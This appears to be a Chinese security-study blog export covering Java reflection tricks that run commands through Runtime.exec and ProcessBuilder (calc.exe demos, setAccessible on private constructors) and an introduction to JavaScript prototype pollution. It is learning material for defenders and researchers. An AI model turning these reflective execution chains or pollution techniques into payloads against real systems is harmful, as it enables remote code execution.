<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%B0%84(3)%5D/image-20230910012544167.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(3)]/image-20230910012544167.png" alt="image-20230910012544167"></a></p>
<p>那如果只在<code>newIntance</code>中传入一个一维数组呢？可以看到如果直接将一个一维数组当作参数传入，<code>newInstance</code>就会当作传入的三个元素【<code>&quot;1&quot;,&quot;2&quot;,&quot;3&quot;</code>】都是一个数组，也就是当作传入了三个数组，而没有把整个数组当作一个对象发送给构造函数中去。</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%B0%84(3)%5D/image-20230910142343462.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(3)]/image-20230910142343462.png" alt="image-20230910142343462"></a></p>
<p>而<code>newInstance</code>需要的是一个对象类型的变长参数，所以只需要强类型转换将我们传入的数组整体当作一个对象类型就行。</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%B0%84(3)%5D/image-20230910142657430.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(3)]/image-20230910142657430.png" alt="image-20230910142657430"></a></p>
<p>可以看到成功运行，不过一般情况是用不了强类型转换的，只能用反射之类的方法。</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%B0%84(3)%5D/image-20230910142957441.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(3)]/image-20230910142957441.png" alt="image-20230910142957441"></a></p>
<p>那为什么传入二维数组的时候不用强类型转换呢？</p>
<p>虽然传入的是二维数组，但实际真正的对象是其元素，也就是一维数组，所以如果直接强类型把二维数组也当做对象传给<code>newIntance</code>反而会报错，<code>newIntance</code>参数类型不匹配，因为<code>newIntrance</code>期待的也是一个一维数组，也就是起作用的只是二维数组中那一个一维数组。</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%B0%84(3)%5D/image-20230910144957733.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(3)]/image-20230910144957733.png" alt="image-20230910144957733"></a></p>
<p>根据p神建议将<code>payload</code>改成全反射方法，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span> <span class="title class_">String</span>[][]&#123;&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;&#125;));</span><br></pre></td></tr></table></figure>

<p>也是可以的，</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%B0%84(3)%5D/image-20230910155334300.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(3)]/image-20230910155334300.png" alt="image-20230910155334300"></a></p>
<h2 id="getDeclared"><a href="#getDeclared" class="headerlink" title="getDeclared"></a>getDeclared</h2><p>这里就是解决第二个问题</p>
<blockquote>
<p>如果一个方法或构造方法是私有方法，我们是否能执行它呢？</p>
</blockquote>
<p>这里就引入了一个<code>getDeclared</code>系列的反射，和<code>getMethod</code>、<code>getConstructor</code>区别在于</p>
<ul>
<li><code>getMethod</code>系列方法获取的是当前类中所有的公共方法，包括从父类继承的方法</li>
<li><code>getDeclared</code>系列方法获取的是当前类中<code>声明</code>的方法，包括私有方法，但是是必须写在类中的，如果是从父类继承而来的就不包含了。</li>
</ul>
<p>其中<code>getDeclaredMethod</code>和<code>getDeclaredConstructor</code>的具体用法，与<code>getMethod</code>和<code>getConstructor</code>类似，区别如上所述。</p>
<p>在此第二篇讲过，<code>Runtime</code>的构造函数是私有的，是通过静态方法<code>Runtime.getRuntime()</code>获取其运行实例现在了解了<code>getDeclaredConstructor</code>，就可以通过这个获取<code>Runtime</code>的私有的构造方法来实例化对象，进而执行命令。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(clazz.getDeclaredConstructor().newInstance(), <span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>这里就是将</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">xx.invoke(clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(<span class="literal">null</span>), <span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>替换为</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">xx.invoke(clazz.getDeclaredConstructor().newInstance(), <span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>



<h2 id="setAccessible"><a href="#setAccessible" class="headerlink" title="setAccessible"></a>setAccessible</h2><p>运行发生报错，</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%B0%84(3)%5D/image-20230910172547619.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(3)]/image-20230910172547619.png" alt="image-20230910172547619"></a></p>
<blockquote>
<p>这里报错在p神的文章中说到，这里必须要使用一个方法<code>setAccessible</code>，在获取到了一个私有方法后，必须用<code>setAccessible</code>修改器作用域，否则仍然不能调用。</p>
</blockquote>
<p>所有在这里就报错提醒<code>Runtime</code>构造函数是私有的无法获取，只需要设置<code>setAccessible</code>为<code>true</code>即可拥有访问域。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Runtime_Getdeclared</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">m</span> <span class="operator">=</span> clazz.getDeclaredConstructor();</span><br><span class="line">        m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(m.newInstance(), <span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是还是报错，</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%B0%84(3)%5D/image-20230910174535081.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(3)]/image-20230910174535081.png" alt="image-20230910174535081"></a></p>
<p>问了AI才知道，</p>
<blockquote>
<p>这个错误是因为Java 9引入的模块系统。在模块化Java应用程序中，一个模块只能访问到它明确打开给其他模块的包。在你的情况下，<code>java.lang</code>包没有被打开给你的模块，所以你不能访问它的私有成员</p>
<p>从<code>Java 9</code>开始，<code>setAccessible(true)</code>不再总是能成功地使得私有成员可访问。如果一个包没有被打开给你的模块，那么尝试访问它的私有成员将会抛出<code>InaccessibleObjectException</code></p>
</blockquote>
<p>正好有个<code>Java8</code>，试试改一下编译器环境变量再跑一下</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%B0%84(3)%5D/image-20230910205325205.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(3)]/image-20230910205325205.png" alt="image-20230910205325205"></a></p>
<p>可能会报错，这是因为这个项目我们已经用高版本的<code>JDK</code>编译过一次了，而高版本能兼容低版本的，但是低版本就无法运行高版本的，所以会报错</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%B0%84(3)%5D/image-20230910213830868.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(3)]/image-20230910213830868.png" alt="image-20230910213830868"></a></p>
<blockquote>
<p><a href="https://blog.csdn.net/superit401/article/details/72731381">https://blog.csdn.net/superit401/article/details/72731381</a></p>
</blockquote>
<p>于是直接写个<code>txt</code>跑<code>Java8</code></p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%B0%84(3)%5D/image-20230910220848024.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(3)]/image-20230910220848024.png" alt="image-20230910220848024"></a></p>
<p>发现运行成功，当然虽然是低版本，但是<code>setAccessible</code>还是必须存在的，</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%B0%84(3)%5D/image-20230910221035690.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(3)]/image-20230910221035690.png" alt="image-20230910221035690"></a></p>
]]></content>
      <categories>
        <category>Java漫谈学习</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>nodejs(原型链污染)深入</title>
    <url>/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/</url>
    <content><![CDATA[<p><code>本来想将p神的JavaScript污染链文章并在我写的基础浅入里，但是感觉还是得分开学习记录，p神干货还得和我水的文章分开，浅入就讲概念理解学习吧，深入就涉及深入认识污染了</code></p>
<span id="more"></span>

<h1 id="prototype和-proto-分别是什么"><a href="#prototype和-proto-分别是什么" class="headerlink" title="prototype和__proto__分别是什么"></a><code>prototype</code>和<code>__proto__</code>分别是什么</h1><blockquote>
<p>这里引用p神的文章，加上部分自己的理解</p>
<p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript</a></p>
</blockquote>
<h2 id="理解"><a href="#理解" class="headerlink" title="理解"></a>理解</h2><p>在JavaScript中，我们如果要定义一个类，需要以<u>定义<code>“构造函数”</code>的方式定义</u>:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Foo</span>()</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230901135415750.png"><img src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230901135415750.png" alt="image-20230901135415750"></a></p>
<p>其中<code>Foo函数</code>就是<code>Foo类</code>的构造函数，其中的<code>this.bar</code>是<code>Foo类</code>中的一个属性。</p>
<p><a data-fancybox="gallery" data-src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230901154849363.png"><img src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230901154849363.png" alt="image-20230901154849363"></a></p>
<blockquote>
<p>也就是说<code>利用function定义类</code>的同时，构造函数也被定义好了</p>
</blockquote>
<blockquote>
<p>在ES6中引入了<code>class</code>的概念，两者是有区别，但是不是很大</p>
<p><code>class</code>本质还是基于原型<code>prototype</code>的实现方式进一步的封装，<code>class</code>本质还是函数<code>function</code></p>
<p>但是使用<code>class</code>定义类比<code>function</code>使得代码<code>更加直观，也更加灵活</code>，因为class定义类时，可以直接使用<code>constructor()</code>方法来定义<code>构造函数</code>，并且可以使用关键字<code>extends</code>来继承父类</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Foo</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230901155300768.png"><img src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230901155300768.png" alt="image-20230901155300768"></a></p>
<blockquote>
<p>可以看到用class定义类的时候，构造函数也是被定义好了</p>
</blockquote>
<p>并且function和class两者的构造函数的名字也是一样的</p>
<p><a data-fancybox="gallery" data-src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230901160722382.png"><img src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230901160722382.png" alt="image-20230901160722382"></a></p>
<hr>
<p>在一个类必然有一些方法，类似属性<code>this.bar</code>，我们也可以将方法定义在构造函数的内部</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">show</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">bar</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">Foo</span>()).<span class="title function_">show</span>()</span><br></pre></td></tr></table></figure>

<p>代码中我们可以看到，<code>show</code>的定义利用了<code>function</code>，但是并没有被定义为<code>show类</code>，也就是说这个show方法并不是和上面一样是所谓<code>show类</code>的构造函数，而是<code>Foo类</code>中<code>Foo</code>这个构造函数的一个方法</p>
<p>如下图结果可以理解，在新建实例化Foo对象，执行构造函数时，<code>show</code>方法也会被执行可知，<code>show</code>只是构造函数中的一个方法，是绑定在对象中的吗，而不是绑定在类</p>
<p><a data-fancybox="gallery" data-src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230901150808861.png"><img src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230901150808861.png" alt="image-20230901150808861"></a></p>
<p><a data-fancybox="gallery" data-src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230901170534691.png"><img src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230901170534691.png" alt="image-20230901170534691"></a></p>
<p>但由此出现了一个新问题，那如果每次<code>新建一个实例化对象就执行一次show方法</code>，有时在实际生产中并不需要，可能大多数时候<code>只想在创建类后执行一次</code>即可</p>
<p>那肯定就不能把<code>show</code>方法再写到<code>function Foo&#123;&#125;</code>中去了，</p>
<blockquote>
<p>这里就需要使用原型<code>prototype</code></p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">show</span> = <span class="keyword">function</span> <span class="title function_">show</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">bar</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> foo = <span class="keyword">new</span> <span class="title class_">Foo</span>()</span><br><span class="line">foo.<span class="title function_">show</span>()</span><br></pre></td></tr></table></figure>

<p>这段代码其实也好理解，我们将<code>show</code>方法单独提出来当作一个函数，并加到<code>Foo</code>的原型当作一个单独的函数，<code>prototype</code>可以当作<code>Foo</code>类自带的一个属性，所有的创建的<code>Foo</code>对象都将拥有<code>Foo</code>类中所有内容，包括变量和方法。</p>
<p><a data-fancybox="gallery" data-src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230901170427183.png"><img src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230901170427183.png" alt="image-20230901170427183"></a></p>
<p>可以看到和在构造函数中定义<code>show</code>不同的是，<code>show</code>作为和构造函数一样的显示在原型内容中，属于是新创建的<code>Foo</code>类对象可以利用的一部分。</p>
<p><a data-fancybox="gallery" data-src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230901171115585.png"><img src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230901171115585.png" alt="image-20230901171115585"></a></p>
<p>这里将<code>Foo</code>类实例化后给<code>foo</code>，<code>foo</code>也完全可以直接调用<code>show</code>函数的内容，<code>foo</code>自身创建开始就具有<code>Foo</code>中的所有变量方法可以调用。</p>
<hr>
<h2 id="关键点"><a href="#关键点" class="headerlink" title="关键点"></a>关键点</h2><p>我们可以通过<code>Foo.prototype</code>来访问<code>Foo</code>类的原型，但是<code>Foo</code>类实例化出来的对象，如上的<code>foo</code>，是不能直接调用<code>prototype</code>进行访问原型的</p>
<p><a data-fancybox="gallery" data-src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230901172350796.png"><img src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230901172350796.png" alt="image-20230901172350796"></a></p>
<p>所以这里就需要提到<code>__proto__</code>，类实例化后的对象可以通过<code>__proto__</code>来直接访问类的原型。</p>
<p>也就是</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">foo.<span class="property">__proto__</span> == <span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230901172719167.png"><img src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230901172719167.png" alt="image-20230901172719167"></a></p>
<p>进一步思考，也就是实例化后的对象【[比如<code>foo</code>]可以像上面例子一样，通过<code>__proto__</code>访问原型定义一个新的函数，如下例子，利用<code>foo.__proto__</code>定义了一个新函数<code>hacker</code></p>
<p>并且能成功调用执行，打印’<code>i get shell</code>‘</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">foo.<span class="property">__proto__</span>.<span class="property">hacker</span> = <span class="keyword">function</span> <span class="title function_">hacker</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;i get shell&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230901182724283.png"><img src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230901182724283.png" alt="image-20230901182724283"></a></p>
<p><a data-fancybox="gallery" data-src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230901182756972.png"><img src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230901182756972.png" alt="image-20230901182756972"></a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote>
<ol>
<li><code>prototype</code>是一个<code>类的属性</code>，所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法</li>
<li>一个对象的<code>__proto__</code>属性，指向这个对象所在的类的<code>prototype</code>属性</li>
</ol>
</blockquote>
<h1 id="JavaScript原型链继承"><a href="#JavaScript原型链继承" class="headerlink" title="JavaScript原型链继承"></a>JavaScript原型链继承</h1><p>继承在java中很常见，在JavaScript中作用也差不多，只不过概念被替换成原型了</p>
<blockquote>
<p>所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法，这个特性被用来实现JavaScript中的继承机制。</p>
</blockquote>
<p>比如，</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Father</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Donald&#x27;</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">last_name</span> = <span class="string">&#x27;Trump&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Son</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">first_name</span> = <span class="string">&#x27;Melania&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Son</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Father</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> <span class="title class_">Son</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Name: <span class="subst">$&#123;son.first_name&#125;</span> <span class="subst">$&#123;son.last_name&#125;</span>`</span>)</span><br></pre></td></tr></table></figure>

<p>这里的，</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Son</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Father</span>()</span><br></pre></td></tr></table></figure>

<p>可以理解为Son的原型为实例化的Father类，Son类就会继承Father类得得<code>last_name</code>属性，但是继承不会覆盖自己原有的属性，所以<code>first_name</code>还是Son类自己的</p>
<p><a data-fancybox="gallery" data-src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230905094854794.png"><img src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230905094854794.png" alt="image-20230905094854794"></a></p>
<p>然后再将<code>Son</code>实例化给<code>son</code>，那么<code>son</code>就具有<code>Son类</code>和<code>Father类</code>的所有属性</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> son = <span class="keyword">new</span> <span class="title class_">Son</span>()</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230905095519407.png"><img src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230905095519407.png" alt="image-20230905095519407"></a></p>
<p>可以在这里的层次就可以看出，<code>son</code>的<code>first_name</code>是<code>以Son类为主</code>的，而由于自身没有<code>last_name</code>，就会从自己<code>原型Father类</code>继承<code>last_name</code>然后获取值</p>
<p>于是当打印时，最后输出的是<code>Name: Melania Trump</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Name: <span class="subst">$&#123;son.first_name&#125;</span> <span class="subst">$&#123;son.last_name&#125;</span>`</span>)</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230905095812582.png"><img src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230905095812582.png" alt="image-20230905095812582"></a></p>
<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>以上述的Son类和Father类为例，我们可以看到son的层次中，是有两个<code>Prototype</code>，这就是原型链的最简单的格式。最后一个<code>Object</code>就是<code>null</code>，他在原型Father类的后面，这也是原型链默认的最后一个原型。</p>
<p>我们可以考虑一个问题，当我在打印<code>$&#123;son.last_name&#125;</code>，如果在<code>Father类</code>中也没有这个属性会怎么样呢，那son就会不断的顺着原型链一直找下去，直到<code>null</code></p>
<p>就会执行，</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">son.<span class="property">__proto__</span>.<span class="property">__proto__</span>.<span class="property">__proto__</span>.<span class="property">__proto__</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230905100719829.png"><img src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230905100719829.png" alt="image-20230905100719829"></a></p>
<p><code>JavaScript</code>这种查找机制，被用在面向对象的继承中，被称作<code>prototype</code>继承链。</p>
<p>以上是最基础的JavaScript面向对象编程，我们并不深入研究更细节的内容，只要牢记下面几点即可：</p>
<blockquote>
<ol>
<li>每个构造函数都有一个原型对象</li>
<li>对象的<code>__proto__</code>属性，指向类的原型对象<code>prototype</code></li>
<li>JavaScript使用prototype链实现继承</li>
</ol>
</blockquote>
<h1 id="原型链污染是什么"><a href="#原型链污染是什么" class="headerlink" title="原型链污染是什么"></a>原型链污染是什么</h1><p>在最开始写过<code>foo.__proto__</code>指向Foo类的<code>prototype</code>，我们也试过通过<code>foo.__proto__</code>新增一个新函数，也可以加到原型中去，并且可以成功调用与构造函数同一层次，那么如果修改<code>foo.__proto__</code>中的一些值，同理也可以修改Foo类中的一些东西</p>
<p>我们简单试一下，</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// foo是一个简单的JavaScript对象</span></span><br><span class="line"><span class="keyword">let</span> foo = &#123;<span class="attr">bar</span>: <span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// foo.bar 此时为1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改foo的原型（即Object）</span></span><br><span class="line">foo.<span class="property">__proto__</span>.<span class="property">bar</span> = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于查找顺序的原因，foo.bar仍然是1</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 此时再用Object创建一个空的zoo对象</span></span><br><span class="line"><span class="keyword">let</span> zoo = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看zoo.bar</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(zoo.<span class="property">bar</span>)</span><br></pre></td></tr></table></figure>

<p>首先我们先构造一个简单对象foo，</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> foo = &#123;<span class="attr">bar</span>: <span class="number">1</span>&#125;</span><br></pre></td></tr></table></figure>

<p>由于foo并不是某个具体类的实例，但是所有对象都有一个实例存在，那就<code>Object</code>类</p>
<p>然后我们先看看，</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>)</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230905101905435.png"><img src="/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/image-20230905101905435.png" alt="image-20230905101905435"></a></p>
